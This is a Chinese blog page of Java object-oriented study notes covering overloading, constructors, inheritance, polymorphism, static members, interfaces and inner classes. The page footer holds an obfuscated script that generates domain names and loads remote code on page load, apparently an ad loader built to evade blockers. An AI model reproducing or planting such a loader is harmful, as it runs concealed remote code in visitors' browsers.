<p>基本数据类型进行的是值拷贝，形参的任何变化都不会影响实参<br> 引用数据类型是地址传递，可以通过形参影响实参（<strong>对象</strong>也是引用数据类型）</p> 
<h3><a id="2__311"></a>2. 递归</h3> 
<h3><a id="3__312"></a>3. 方法重载</h3> 
<p>java 中允许同一个类中，多个同名方法的存在，但要求 形参列表不一致！<br> <img src="https://images2.imgbox.com/e3/7a/ihCTEw4b_o.png" alt="在这里插入图片描述"><br> 构成方法重载就两个要素：1方法名相同；2形参结构不同<br> 实参匹配时，优先匹配类型完全一致的，若无，再匹配类型能自动转换的方法</p> 
<h3><a id="4__317"></a>4. 可变参数</h3> 
<p>基本语法：</p> 
<pre><code class="prism language-java">访问修饰符 返回类型 方法名<span class="token punctuation">(</span>数据类型<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 形参名<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/36/ff/Nir49PJv_o.png" alt="在这里插入图片描述"><br> 直接把nums当做数组处理即可。<br> <img src="https://images2.imgbox.com/4f/be/s6CC7Q38_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="5__326"></a>5. 作用域</h3> 
<p><img src="https://images2.imgbox.com/5b/5a/3qzvL8NY_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/6c/34/mm04cOOi_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="6__330"></a>6. 构造器/构造方法</h3> 
<pre><code class="prism language-java"><span class="token punctuation">[</span>修饰符<span class="token punctuation">]</span> 方法名<span class="token punctuation">(</span>形参列表<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
方法体<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>注意点</p> 
<ol><li>构造器的修饰符可以默认， 也可以是 public protected private</li><li>构造器<strong>没有返回值</strong>，<strong>也不写void</strong></li><li><strong>方法名 和类名字必须一样</strong></li><li>参数列表 和 成员方法一样的规则</li><li>构造器的调用, 由系统完成</li><li>构造器的存在，可以<strong>在new的时候就传入信息</strong>，例如Person p1 = new Person(“smith”, 80);</li></ol> 
<h4><a id="_345"></a>构造器细节</h4> 
<p><img src="https://images2.imgbox.com/ca/9a/gfzPKZaH_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_347"></a>含构造器的对象创建流程分析</h4> 
<p><img src="https://images2.imgbox.com/a7/62/mpec6orF_o.png" alt="在这里插入图片描述"><br> 构造器初始化是对象初始化中最后执行的，所以构造器的输入内容，是最终的初始化内容</p> 
<h3><a id="7_this_350"></a>7. this</h3> 
<p>哪个对象调用this，this就指代哪个对象<br> <img src="https://images2.imgbox.com/f1/3c/KkryWz56_o.png" alt="在这里插入图片描述"></p> 
<ol><li>this 关键字可以用来访问本类的属性、方法、构造器</li><li>this 用于区分当前类的属性和局部变量</li><li>访问成员方法的语法：this.方法名(参数列表);</li><li>访问构造器语法：this(参数列表); 注意只能在构造器中使用(<strong>即只能在构造器中访问另外一个构造器, 必须放在第一条语句</strong>)</li><li>this 不能在类定义的外部使用，只能在类定义的方法中使用。</li></ol> 
<h3><a id="8__359"></a>8. 本章习题</h3> 
<p><img src="https://images2.imgbox.com/08/e3/iG3s7QtH_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_361"></a>七、面向对象（中级）</h2> 
<h3><a id="1_IDEA_362"></a>1. IDEA</h3> 
<h4><a id="_363"></a>常用快捷键</h4> 
<ol><li>删除当前行, 默认是 ctrl + Y 自己配置 ctrl + d</li><li>复制当前行, 自己配置 ctrl + alt + 向下光标</li><li>补全代码 alt + /</li><li>添加注释和取消注释 ctrl + / 【第一次是添加注释，第二次是取消注释】</li><li>导入该行需要的类 先配置 auto import , 然后使用 alt+enter 即可</li><li>快速格式化代码 ctrl + alt + L</li><li>快速运行程序 自己定义 alt + R</li><li><strong>生成构造器等 alt + insert</strong> ，<strong>按住CTRL再点击可实现多选</strong></li><li>查看一个类的层级关系 ctrl + H [学习继承后，非常有用]</li><li>将光标放在一个方法上，输入 ctrl + B , 可以定位到方法或原码 [学继承后，非常有用]</li><li>自动的分配变量名 , 通过 在后面<strong>加 .var</strong> [老师最喜欢的]</li><li>ALt+enter报错代码弹出修改提示</li></ol> 
<h4><a id="_377"></a>模板</h4> 
<p><img src="https://images2.imgbox.com/cf/13/HLJyQ3yT_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="2__379"></a>2. 包</h3> 
<p>包的本质就是创建不同的文件夹来保存类文件<br> <img src="https://images2.imgbox.com/ec/53/DZfNUbpf_o.png" alt="在这里插入图片描述"><br> <strong>常用的包：</strong></p> 
<ol><li>java.lang.* //lang 包是基本包，默认引入，不需要再引入.</li><li>java.util.* //util 包，系统提供的工具包, 工具类，使用 Scanner</li><li>java.net.* //网络包，网络开发</li><li>java.awt.* //是做 java 的界面开发，GUI</li></ol> 
<h3><a id="3__387"></a>3. 访问修饰符</h3> 
<ol><li>公开级别:用 public 修饰,对外公开</li><li>受保护级别:用 protected 修饰,对子类和同一个包中的类公开</li><li>默认级别:没有修饰符号,向同一个包的类公开. 4) 私有级别:用 private 修饰,只有类本身可以访问,不对外公开.<br> <img src="https://images2.imgbox.com/55/43/AJQan8OW_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/2d/f0/q6Sfdp9Q_o.png" alt="在这里插入图片描述"></li></ol> 
<h3><a id="4__393"></a>4. 封装（*）</h3> 
<p><img src="https://images2.imgbox.com/06/88/1juzd7bx_o.png" alt="在这里插入图片描述"><br> 封装与构造器结合：在构造器中set<br> <img src="https://images2.imgbox.com/23/f6/pxBhkd4W_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="5__398"></a>5. 继承（*）</h3> 
<p><img src="https://images2.imgbox.com/8f/bb/aWWo0f86_o.png" alt="在这里插入图片描述"></p> 
<ol><li>子类继承了所有的属性和方法，非私有的属性和方法可以在子类直接访问, 但是私有属性和方法不能在子类直接访问，要通过父类提供公共的方法去间接访问</li><li>子类必须<strong>先</strong>调用父类的构造器， 完成父类的初始化，再执行子类构造器（先有父才能有子）</li><li>当创建子类对象时，不管使用子类的哪个构造器，默认情况下总会<strong>先</strong>调用父类的无参构造器（即<strong>有一个默认的super（）</strong>），如果父类没有提供无参构造器，则必须在子类的构造器中用 super去指定使用父类的哪个构造器完成对父类的初始化工作，否则，编译不会通过(父类有无参构造器，可以什么都不写，否则必须super(参数1，参数2)去指定一个有参构造器)</li><li>如果希望指定去调用父类的某个构造器，则显式的调用一下 : super(参数列表)</li><li>super 在使用时，必须放在构造器<strong>第一行</strong>(super 只能在构造器中使用)</li><li>super() 和 this() 都只能放在构造器第一行，因此这两个方法不能共存在一个构造器</li><li>java 所有类都是 Object 类的子类, Object 是所有类的基类.</li><li>父类构造器的调用不限于直接父类！将一直往上追溯直到 Object 类(顶级父类)（构造器执行顺序：顶级父类object—&gt;下一级父类—&gt;下下级父类—&gt;…—&gt;main函数执行的类）</li><li>子类最多只能继承一个父类(指直接继承)，即 java 中是单继承机制。<br> 思考：如何让 A 类继承 B 类和 C 类？ 【A 继承 B， B 继承 C】</li><li>不能滥用继承，子类和父类之间必须满足 is-a 的逻辑关系<br> 11）<strong>子类构造器第一行只要没有this，就默认有一个super()先去调用父类无参构造器</strong></li></ol> 
<h4><a id="_412"></a>继承的本质（**）</h4> 
<p><img src="https://images2.imgbox.com/73/d6/1plC6HiA_o.png" alt="在这里插入图片描述"></p> 
<p>查找关系<br> <img src="https://images2.imgbox.com/e1/ea/tMTTFDIS_o.png" alt="在这里插入图片描述"><br> 如果age是私有，但是爷爷类里的age是公有，还是会直接报错，不会说是遇到父亲类是私有就继续找爷爷类，不会这样，会直接报错<br> <img src="https://images2.imgbox.com/a2/65/JAp8uPZj_o.png" alt="在这里插入图片描述"><br> 输出 a \t b name \t b<br> 要注意的点：</p> 
<ol><li>有this就没有super,所以b类的第一个默认构造器没有super指向a类，反而是this先指向下面的有参构造器</li><li>b类第二个构造器有个默认的super()</li></ol> 
<h4><a id="super_424"></a>super关键字</h4> 
<p><img src="https://images2.imgbox.com/48/5e/84XelWaM_o.png" alt="在这里插入图片描述"><br> super和this语法很像，只是this是指代本类，super是指代父类<br> <img src="https://images2.imgbox.com/08/c6/aZFsVrtC_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_428"></a>方法重写/覆盖</h4> 
<p><img src="https://images2.imgbox.com/66/a7/3Hd0XWRi_o.png" alt="在这里插入图片描述"><br> <strong>重写和重载的比较</strong><br> <img src="https://images2.imgbox.com/30/c1/9VHkMoyZ_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="6__433"></a>6. 多态</h3> 
<p><strong>方法就看运行类型，属性就找编译类型</strong><br> <img src="https://images2.imgbox.com/45/e1/lKZGLnG7_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="httpsimgblogcsdnimgcna1b953f32ac54c729542cdee31b2ae4cpng_437"></a>对象的多态（*）<img src="https://images2.imgbox.com/8f/dc/DAeus0bA_o.png" alt="在这里插入图片描述"></h4> 
<p>向上转型：<br> <img src="https://images2.imgbox.com/3c/7a/FQSK4X7d_o.png" alt="在这里插入图片描述"><br> <strong>不能调用子类中的特有成员是因为在编译阶段能调用哪些成员是由编译类型决定的<br> 运行的时候跟继承一样，先从子类开始找方法，再逐次往父类开始找</strong></p> 
<p>向下转型（因为向上转型不能调用子类的特有成员，所以可以使用向下转型去寻找）<br> <img src="https://images2.imgbox.com/07/d8/tptezI2N_o.png" alt="在这里插入图片描述"><br> 示例：</p> 
<pre><code class="prism language-java"><span class="token class-name">Animal</span> animal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Cat</span> cat <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Cat</span><span class="token punctuation">)</span> animal<span class="token punctuation">;</span>
</code></pre> 
<p>第三条：即原来的引用就是cat,本身就是cat才能强转cat</p> 
<p>属性没有重写之说！属性的值看<strong>编译类型</strong><br> 方法才是从下往上查找<br> <img src="https://images2.imgbox.com/16/c0/UhQFe9is_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="instanceOf_456"></a>instanceOf</h4> 
<pre><code class="prism language-java">a instanceOf <span class="token constant">XX</span> <span class="token comment">//该语句不含括号  XX不是写在括号内的</span>
</code></pre> 
<p>比较操作符，用于判断a对象的<strong>运行类型</strong>是否为 XX 类型或 XX 类型的子类型</p> 
<h4><a id="_463"></a>动态绑定机制（**）</h4> 
<p><img src="https://images2.imgbox.com/3a/c6/2FgqqzzF_o.png" alt="在这里插入图片描述"><br> 1） 执行方法时，看运行类型是哪个类，就去哪个类找方法，若无，依次往上找父类中的方法。若父类中的方法需要调用方法2，仍先去<strong>运行类型类</strong>中找方法2，找不到再依次往上，依次类推。<strong>即每次找方法，都要先在运行类型的这个类空间里找</strong><br> 2） 调用属性时，就近找就完事了</p> 
<h4><a id="_467"></a>多态数组</h4> 
<p>数组的定义类型为父类类型，里面保存的实际元素类型为子类类型<br> 若要调用子类特有的方法，就向下强转使用</p> 
<h4><a id="_470"></a>多态参数</h4> 
<p>形参是父类型，实参是子类型</p> 
<h3><a id="7_Object_472"></a>7. Object类</h3> 
<h4><a id="equals_473"></a>==和equals的区别</h4> 
<p><img src="https://images2.imgbox.com/34/c8/vmtyASZG_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/4f/a0/2AURlkQa_o.png" alt="在这里插入图片描述"></p> 
<p>interger和string子类中的equals都是判断内容是否相等<br> <img src="https://images2.imgbox.com/a3/1f/eJpfTSxS_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="toString_479"></a>toString</h4> 
<p>默认返回：全类名+@+哈希值的十六进制<br> 但一般都不用默认，一般都是用于打印对象或拼接对象，Alt+Insert可以直接调出新的约定的toString方法<br> 当直接输出一个对象时，toString 方法会被默认的调用, 比如System.out.println(monster)； 就会默认调用monster.toString()</p> 
<h3><a id="8__484"></a>8. 断点调试</h3> 
<p>在调试过程中，是运行状态，所以执行的是对象的<strong>运行类型</strong><br> F7(跳入方法内) F8(跳过) shift+F8(跳出) F9(resume,执行到下一个断点)<br> F7：跳入方法内<br> F8: 逐行执行代码. shift+F8: 跳出方法</p> 
<h2><a id="_490"></a>八、面向对象（高级）</h2> 
<h3><a id="1__491"></a>1. 类变量和类方法</h3> 
<p>总结：<strong>静态只能访问静态成员，不能访问super和this，非静态都可以访问，都要注意访问权限</strong></p> 
<h4><a id="_493"></a>类变量</h4> 
<p><img src="https://images2.imgbox.com/66/06/kL8YPBr7_o.png" alt="候就生成"><br> <img src="https://images2.imgbox.com/68/35/okACpPat_o.png" alt="在这里插入图片描述"><br> 类变量的访问修饰符权限同变量的修饰符权限一致<br> <img src="https://images2.imgbox.com/0e/55/2i4TWOOx_o.png" alt="在这里插入图片描述"><br> 因为类加载，类变量就创建了，所以类.类变量名就可以使用，无需先实例化类</p> 
<h4><a id="_499"></a>类方法</h4> 
<p><img src="https://images2.imgbox.com/50/53/1Ey1sfVr_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/7c/98/qcSh6W2q_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="2_main_502"></a>2. main方法</h3> 
<p><img src="https://images2.imgbox.com/50/b0/dm9aq5wf_o.png" alt="在这里插入图片描述"></p> 
<ol><li>在 main()方法中，我们可以直接调用 main 方法所在类的<strong>静态方法或静态属性</strong>。</li><li>但是，不能直接访问该类中的非静态成员，必须创建该类的一个实例对象后，才能通过这个对象去访问类中的非静态成员</li></ol> 
<h4><a id="IDEAmain_506"></a>IDEA给main传参数</h4> 
<p><img src="https://images2.imgbox.com/72/d0/eeZjKDMS_o.png" alt="在这里插入图片描述"><br> 有个program arguments<br> <img src="https://images2.imgbox.com/2d/d7/MkmfetTd_o.png" alt="在这里插入图片描述"><br> 填入运行即可</p> 
<h3><a id="3__511"></a>3. 代码块</h3> 
<p><img src="https://images2.imgbox.com/19/13/BeIVqUsZ_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/a2/44/dKbVXZ6w_o.png" alt="在这里插入图片描述"></p> 
<ol><li>普通代码块只跟创建对象有关系，创建几次执行几次，跟类是否加载毫无关系（<strong>静态代码块看加载，且只执行一次；普通代码块看创建对象，有几次来几次</strong>）<strong>普通代码块可以视为构造器的补充</strong>，构造器被调用它才会跟着被调用，而加载类是不调用构造器的，只有创建对象会调用构造器<br> <img src="https://images2.imgbox.com/3c/91/QqqubxWZ_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/40/45/XBtg7lkD_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/80/51/SqSHm8L1_o.png" alt="在这里插入图片描述"><br> <strong>静态一定都在普通前面</strong>，不管是父类还是子类的静态（因为是<strong>先进行类加载再创建对象</strong>，加载阶段静态的就开始工作了，而普通的要等到后续创建对象才行）<br> <img src="https://images2.imgbox.com/99/54/aCTHE9zo_o.png" alt="在这里插入图片描述"><br> 静态代码块本质也是静态方法，只能调用静态成员</li></ol> 
<h3><a id="4_final_524"></a>4. final</h3> 
<p><strong>final可以修饰形参</strong>，但是这个形参不能再改动了<br> <img src="https://images2.imgbox.com/68/7c/P4h3yBMu_o.png" alt="在这里插入图片描述"><br> 不能被继承就很难使用，这个方法就没意义了<br> <img src="https://images2.imgbox.com/a3/90/2Qev92Bq_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="5__529"></a>5. 抽象类</h3> 
<p><img src="https://images2.imgbox.com/46/ea/8FH4UMdw_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/da/81/QPiz84pT_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/13/39/ucC3S2oM_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/cd/5e/mmNLtDgn_o.png" alt="在这里插入图片描述"><br> 因为抽象方法是必须要被子类重写的，但这三个关键字都不允许重写</p> 
<h3><a id="6__535"></a>6. 接口</h3> 
<p>接口可以视为一个<strong>更加抽象的抽象类</strong><br> <img src="https://images2.imgbox.com/22/86/W5XynD5j_o.png" alt="在这里插入图片描述"><br> 即jdk8后，<strong>接口中可以含有default，static，abstract三种方法</strong><br> <img src="https://images2.imgbox.com/da/2c/5Sfb9NHO_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/1e/c7/p2dnJqkl_o.png" alt="在这里插入图片描述"><br> 第七条，实现接口的类也都可以使用接口中的属性</p> 
<h3><a id="7__543"></a>7. 内部类</h3> 
<p>如果定义类在<strong>局部位置</strong>(方法中/代码块) :(1) 局部内部类 (2) <strong>匿名内部类</strong><br> 定义在<strong>成员位置</strong> (1) 成员内部类 (2) 静态内部类</p> 
<h4><a id="1__546"></a>1. 局部内部类</h4> 
<p><img src="https://images2.imgbox.com/3e/2d/ZrN0unSY_o.png" alt="在这里插入图片描述"><br> 第七条：<strong>Outer02.this 本质就是外部类的对象, 即哪个对象调用了 m1, Outer02.this</strong></p> 
<h4><a id="2__549"></a>2. 匿名内部类</h4> 
<p>匿名内部类可以<strong>当做实参直接传递</strong>，简洁高效<br> <img src="https://images2.imgbox.com/ec/11/gLFK0Dgs_o.png" alt="在这里插入图片描述"></p> 
<ol><li>匿名内部类会由系统分配一个名字（外类+$1（这个按顺序编号，是第几个匿名内部类就是$几））（匿名不是无名，就像QQ匿名模式会分配给你一个随机名字一样）。匿名内部类只用一次，且因为语法有new，每次使用都伴随着对象实例的创建</li><li>相比于创建对象的语法，匿名内部类多了<strong>一对括号</strong>，结尾别漏分号，因为是个语句</li><li>匿名内部类的形参列表会传递给构造器</li></ol> 
<p><img src="https://images2.imgbox.com/3d/28/HEmxARtt_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/a3/f6/Zb4rmz0N_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/41/6f/KU1Kf5DG_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="3__562"></a>3. 成员内部类</h4> 
<h4><a id="4__564"></a>4. 静态内部类</h4>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/42ce8628ab5875b968293febc6921171/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Error updating database. Cause:java.sql.SQLException: Lock wait timeout exceeded； try 清除数据库执行时间较长的任务</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/1d76c0f4d7c5208d5912306236743993/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">win电脑C/D盘清理技巧</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>